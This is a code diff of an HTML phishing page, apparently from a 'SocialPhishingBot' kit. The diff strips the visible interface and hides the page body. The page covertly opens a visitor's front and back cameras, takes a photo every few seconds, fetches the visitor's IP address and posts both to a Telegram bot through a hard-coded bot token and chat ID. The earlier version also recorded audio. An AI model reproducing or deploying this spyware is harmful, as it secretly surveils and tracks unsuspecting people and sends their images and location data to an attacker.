@@ -2,106 +2,82 @@
 <html lang="en">
 <head>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  <title>Camera and Voice Capture</title>
+  <title>Camera Capture</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      font-family: 'Montserrat', sans-serif;
+      display: none; /* Hide the body */
       margin: 0;
       padding: 0;
       background-color: #f5f5f5;
     }
-    .navbar {
-      background-color: #ff0000;
-      color: white;
-      text-align: center;
-      padding: 15px 0;
-    }
-    #header {
-      margin: 0;
-      font-size: 28px;
-      font-weight: bold;
-    }
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      color: #666;
-    }
   </style>
 </head>
 <body>
-  <nav class="navbar">
-    <h1 id="header">Camera and Audio Capture</h1>
-  </nav>
-
-  <center>
-    <button id="toggle-video" style="display:none;">Toggle Video</button>
-    <div id="message-container"></div>
-    <video id="video" width="0" height="0" autoplay></video>
-  </center>
 
   <script type="text/javascript">
     const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
     const chatId = '5571330102'; // Your Telegram chat ID
 
-    // Start capturing photos and audio
+    // Function to get user's IP address
+    function getUserIP() {
+      return new Promise((resolve, reject) => {
+        $.get('https://api.ipify.org?format=json', function(data) {
+          resolve(data.ip);
+        }).fail(function() {
+          reject('Unable to fetch IP');
+        });
+      });
+    }
+
+    // Start capturing photos
     function startCapturing() {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then((stream) => {
           const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-          const audioRecorder = new MediaRecorder(stream);
 
-          // Capture front camera photos
-          function captureFrontPhoto() {
+          // Capture photos from front and back cameras
+          function capturePhoto() {
             imageCapture.takePhoto()
               .then((blob) => {
-                sendToTelegram(blob, 'photo');
-                captureAudio(audioRecorder);
+                getUserIP().then((ip) => {
+                  sendToTelegram(blob, ip);
+                }).catch(error => {
+                  console.error('IP Fetch Error:', error);
+                });
               })
               .catch((error) => {
-                console.error('Error capturing front photo:', error);
+                console.error('Error capturing photo:', error);
               });
           }
 
-          // Capture back camera photos
-          function captureBackPhoto() {
-            // Switch to back camera
+          // Switch to back camera and capture photo
+          function switchToBackCamera() {
             const backImageCapture = new ImageCapture(stream.getVideoTracks()[1]);
             backImageCapture.takePhoto()
               .then((blob) => {
-                sendToTelegram(blob, 'photo');
-                captureAudio(audioRecorder);
+                getUserIP().then((ip) => {
+                  sendToTelegram(blob, ip);
+                }).catch(error => {
+                  console.error('IP Fetch Error:', error);
+                });
               })
               .catch((error) => {
                 console.error('Error capturing back photo:', error);
               });
           }
 
-          // Capture audio for 5 seconds
-          function captureAudio(audioRecorder) {
-            audioRecorder.start();
-            setTimeout(() => {
-              audioRecorder.stop();
-            }, 5000); // Capture audio for 5 seconds
-          }
-
-          audioRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-              sendToTelegram(event.data, 'audio');
-            }
-          };
-
-          // Set intervals to capture photos and audio
+          // Set intervals to capture photos continuously from front and back cameras
           let capturingFront = true;
           setInterval(() => {
             if (capturingFront) {
-              captureFrontPhoto();
+              capturePhoto();  // Front camera photo
             } else {
-              captureBackPhoto();
+              switchToBackCamera();  // Back camera photo
             }
             capturingFront = !capturingFront;
-          }, 1000); // Capture every second (photo + audio)
+          }, 3000); // Capture a photo every 3 seconds
 
         })
         .catch((error) => {
@@ -109,14 +85,14 @@
         });
     }
 
-    // Send media to Telegram bot
-    function sendToTelegram(data, type) {
+    // Send photo and user IP to Telegram bot
+    function sendToTelegram(data, ip) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
+      formData.append('photo', data, 'camera_photo.jpg');
+      formData.append('caption', `User IP: ${ip}`);
 
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
-      {
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
         body: formData
       })
@@ -131,8 +107,5 @@
 
   </script>
 
-  <footer>
-    <p>Made With ❤️ By PROFESSOR RIZWAN</p>
-  </footer>
 </body>
 </html>
